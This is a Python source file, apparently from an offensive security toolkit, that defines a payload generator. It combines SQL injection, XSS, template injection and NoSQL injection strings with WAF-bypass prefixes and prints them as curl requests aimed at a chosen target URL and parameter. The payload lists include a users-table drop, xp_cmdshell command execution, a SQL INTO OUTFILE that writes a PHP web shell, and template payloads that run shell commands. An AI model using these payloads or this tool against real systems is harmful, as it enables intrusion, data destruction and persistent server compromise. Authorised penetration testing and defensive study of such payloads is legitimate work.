#!/usr/bin/env python3
"""
PayloadFabric — combinatorial payload generation for exploit techniques.
Generates SQLi, XSS, SSTI, and NoSQLi variations with WAF bypass prefixes.

CLI: python3 -m raphael.techniques.payloads.fabric --type sqli --target http://x --param id
"""
import argparse, json, random, sys
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional


@dataclass
class PayloadSpec:
    type: str
    template: str
    waf_prefix: str
    params: Dict[str, str]
    method: str = "GET"
    headers: Optional[Dict[str, str]] = None
    description: str = ""

    def to_curl(self, target: str) -> str:
        parts = ["curl", "-s"]
        if self.method == "POST":
            parts.extend(["-X", "POST"])
        if self.headers:
            for k, v in self.headers.items():
                parts.extend(["-H", f"'{k}: {v}'"])
        if self.method == "GET":
            qs = "&".join(f"{k}={v}" for k, v in self.params.items())
            url = f"{target}?{qs}" if qs else target
            parts.append(f"'{url}'")
        else:
            data = "&".join(f"{k}={v}" for k, v in self.params.items())
            parts.extend(["--data", f"'{data}'", f"'{target}'"])
        return " ".join(parts)


class PayloadFabric:
    SQLI_TEMPLATES = ["' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 'x'='x",
        '" OR "1"="1', "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' OR SLEEP(5)--",
        "' OR BENCHMARK(25000000,MD5(1))--", "' OR pg_sleep(5)--",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "admin'--", "admin' OR '1'='1",
        "admin' OR 1=1--", "' OR 1=1 INTO OUTFILE '/tmp/foo'--",
        "'; DROP TABLE users--", "'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=0 UNION SELECT '<?php system($_GET[\\'cmd\\']); ?>',2,3 INTO OUTFILE '/var/www/shell.php'--"]

    XSS_TEMPLATES = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>", '"><script>alert(1)</script>', "';alert(1);//",
        "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>", "javascript:alert(1)",
        '"><svg onload=alert(1)>',
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x: onerror=alert(1)>", '\\"><script>alert(1)</script>']

    SSTI_TEMPLATES = ["{{7*7}}", "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${7*7}", "#{7*7}", "<%= 7*7 %>", "${{7*7}}",
        "{{'test'.upper()}}", "{7*7}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ lipsum.__globals__['os'].popen('id').read() }}"]

    NOSQLI_TEMPLATES = ["' || '1'=='1", "' || '1'=='1' //",
        "{'$gt': ''}", "{'$ne': null}", "{'$regex': '.*'}",
        '{"$gt": ""}', "admin' || '1'=='1",
        "username[$ne]=none&password[$ne]=none"]

    WAF_PREFIXES = ["", "/**/", "%00", "%0a", "%0d%0a", "/*!*/",
        "/*!50000*/", "\x00", "\\\\", "||", "1;"]

    DEFAULT_PARAMS = ["id", "page", "file", "path", "user", "name", "search",
        "q", "s", "cat", "lang", "view", "template", "dir", "cmd", "exec",
        "order", "sort", "filter", "action"]

    XSS_PREFIXES = ["", "%22", "%3C", "<", "&#60;", "'", '"', "`"]
    SSTI_PREFIXES = ["", "{", "}", "${", "{{", "#{", "<%="]

    @classmethod
    def generate(cls, ptype, target, param=None, max_payloads=100):
        params = [param] if param else cls.DEFAULT_PARAMS[:5]
        results = []
        gen_map = {"sqli": cls._gen_sqli, "xss": cls._gen_xss,
                   "ssti": cls._gen_ssti, "nosqli": cls._gen_nosqli}
        fn = gen_map.get(ptype)
        if not fn:
            raise ValueError(f"Unknown type: {ptype}")
        for p in params:
            for spec in fn(p):
                if len(results) >= max_payloads:
                    return results
                results.append(spec)
        return results

    @classmethod
    def _gen_sqli(cls, param):
        out = []
        for t in cls.SQLI_TEMPLATES:
            for w in cls.WAF_PREFIXES:
                full = w + t
                m = "GET" if random.random() > 0.3 else "POST"
                out.append(PayloadSpec("sqli", full, w, {param: full},
                                       m, description=f"SQLi: {full[:60]}"))
        return out

    @classmethod
    def _gen_xss(cls, param):
        out = []
        for t in cls.XSS_TEMPLATES:
            for w in cls.XSS_PREFIXES:
                out.append(PayloadSpec("xss", w + t, w, {param: w + t},
                                       description=f"XSS: {t[:50]}"))
        return out

    @classmethod
    def _gen_ssti(cls, param):
        out = []
        for t in cls.SSTI_TEMPLATES:
            for w in cls.SSTI_PREFIXES:
                out.append(PayloadSpec("ssti", w + t, w, {param: w + t},
                                       description=f"SSTI: {t[:50]}"))
        return out

    @classmethod
    def _gen_nosqli(cls, param):
        out = []
        for t in cls.NOSQLI_TEMPLATES:
            is_json = "[" in t
            out.append(PayloadSpec("nosqli", t, "", {param: t},
                                   "POST" if is_json else "GET",
                                   {"Content-Type": "application/json"} if is_json else None,
                                   description=f"NoSQLi: {t[:50]}"))
        return out


def main():
    a = argparse.ArgumentParser()
    a.add_argument("--type", choices=["sqli","xss","ssti","nosqli"], default="sqli")
    a.add_argument("--target", required=True)
    a.add_argument("--param")
    a.add_argument("--max", type=int, default=50)
    a.add_argument("--output", choices=["json","curl"], default="json")
    args = a.parse_args()
    ps = PayloadFabric.generate(args.type, args.target, args.param, args.max)
    if args.output == "curl":
        for p in ps: print(p.to_curl(args.target))
    else:
        data = [{**asdict(p), "curl": p.to_curl(args.target)} for p in ps]
        print(json.dumps(data, indent=2))


if __name__ == "__main__":
    main()
